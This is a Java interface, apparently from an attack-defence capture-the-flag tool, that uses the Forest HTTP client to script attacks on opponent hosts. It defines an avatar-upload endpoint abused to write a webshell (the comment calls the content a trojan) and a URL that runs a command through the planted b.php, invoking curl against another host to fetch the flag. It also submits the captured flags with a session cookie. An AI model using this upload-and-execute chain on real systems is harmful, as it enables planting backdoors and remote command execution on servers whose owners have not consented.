package cn.xiaoyes.ctf;

import com.dtflys.forest.annotation.*;
import com.dtflys.forest.callback.OnError;
import com.dtflys.forest.callback.OnProgress;

public interface ApiService {

    /* 获取Flag */
    String GET_FLAG_URL = "http://4.4.${c}.100:1013/Uploads/avatar_big/b.php?b=curl%20http://192.168.2.200/Getkey";

    /* 保存Flag */
    String SAVE_FLAG_URL = "http://192.168.2.200/Title/TitleView/savecomprecord";

    /* 上传文件 */
    String UPLOAD_FILE_URL = "http://4.4.6.100:1013/index.php?a=upload&m=Uc&g=Home";

    /* 上传头像 */
    String UPLOAD_AVATAR_URL = "http://4.4.${c}.100:1013/index.php?a=saveAvatar&m=Uc&g=Home&id=1&photoServer=${fileName}&type=big";

    /**
     * 获取Flag
     * @param c C端地址
     * @param onError 错误回调
     * @return
     */
    @Get(GET_FLAG_URL)
    String getFlag(@Var("c") String c, OnError onError);


    /**
     * 提交Flag
     * @param key flag
     * @param token 身份验证
     * @return
     */
    @Post(value = SAVE_FLAG_URL, headers = {
            "Referer:http://192.168.2.200/",
            "Cookie:PHPSESSID=${token}; Path=/; Domain=.192.168.2.200;"
    })
    String saveFlag(@Body("answer") String key, @Var("token") String token);

    /**
     * 文件上传
     * @param filePath 文件地址
     * @param onProgress 上传回调
     * @return
     */
    @Post(value = UPLOAD_FILE_URL)
    String upload(@DataFile("Filedata") String filePath, OnProgress onProgress);

    /**
     * 上传头像(根据Post请求体的字符串创建文件)
     * @param c C端
     * @param content 上传内容(木马)
     * @param fileName 文件名
     * @param onProgress 上传回调
     * @return
     */
    @Post(UPLOAD_AVATAR_URL)
    String uploadAvatar(@Var("c") String c, @JSONBody String content, @Var("fileName") String fileName, OnProgress onProgress);

}
